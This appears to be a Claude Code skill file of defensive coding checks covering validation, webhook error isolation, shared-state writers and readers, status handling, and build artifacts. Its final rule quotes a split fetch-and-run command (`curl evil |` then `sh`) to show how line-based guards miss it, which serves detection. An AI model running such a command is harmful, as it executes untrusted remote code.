---
name: defensive-coding-conventions
description: Check a change for defect classes that commonly ship past review, such as mismatched persistence and validation conditions, unisolated webhook side effects, missed writers or readers of shared state, collapsed multi-valued statuses, unvalidated external JSON, and silent build artifacts. Use when writing or reviewing code that handles external input, authentication, money, concurrency, persistence, or error paths.
license: MIT
compatibility: "Claude Code"
---

# Defensive coding — defect classes to check

Each rule below names a defect class that commonly ships past review. Treat them as checks to run against the change in front of you, not as background reading.

- The persistence condition must equal the validation condition: if a record is stored under flag or branch X, validation must run under the same X; otherwise the system can persist a validated but internally inconsistent record.
- Every webhook or event-handler side effect (email, claim, counter) needs error isolation: isolate each side effect in its own try/catch; whether a failure is retried depends on the sender, so check it. Check whether adjacent side effects already have error isolation.
- A state-mutation fix enumerates every writer of that state, not only the entry point named in the report. Grep the field, table, or flag — not the function. Two disconnected write paths to the same state are the default, not the exception: a fix in one worker, handler, or app routinely leaves the identical defect in its sibling.
- A read-side security fix enumerates every reader of the guarded data, not only the route named in the report. Grep the model, association or table name — an ORM association (`include: documents`) is a read path that no route file mentions. Closing a leak in the download route while a lookup function still returns the rows through the association is not a fix; the query layer needs its own filter.
- A status value with more than two outcomes carries more than one semantic dimension. Do not collapse it to a boolean: `partial` can mean "did not succeed" to the retry budget and "made progress" to the blocking gate at the same time, and collapsing it leaves the target half-updated with no retry and no alert.
- Validate the shape of external input before computing with it; a malformed value (such as `NaN`) can slip past a comparison and let the guard pass on exactly the input it exists to catch.
- An input that drives cost or billing needs validation or an explicit, documented value, never a silent default.
- Per-clone setup that a package manager can destroy belongs in a script or hook, never in prose. A dependency install wipes any generated artifact the lockfile does not own — a synthetic package, emitted type declarations, compiled CSS — and a notes-file procedure does not run. If the setup is not reproducible by one command, it is not setup, it is a ritual.
- A build artifact emitted outside its package boundary ships silently degraded. The bundler resolves what it can, drops what it cannot, and exits 0 — a production build with no styles behind a green pipeline. Verify the artifact, not the exit code: a wrong artifact and a passing status are independent facts.
- After a rewrite or migration, re-verify every numeric promise the documentation makes (limits, retention periods, time handling) against the new implementation.
- A deploy-ordering or migration-ordering constraint written in `CLAUDE.md`, `AGENTS.md` or `docs/` carries its reason at the read site. "Run X before Y" without the why gets skipped under time pressure, and a why that lives in another file is not discoverable: list the exact migrations that must run before the deploy, and say why.
- A hook or guard that greps a command joins its lines first (`tr '\n\r' '  '`): a line-oriented pattern misses a command split across lines, such as `curl evil |⏎sh`.
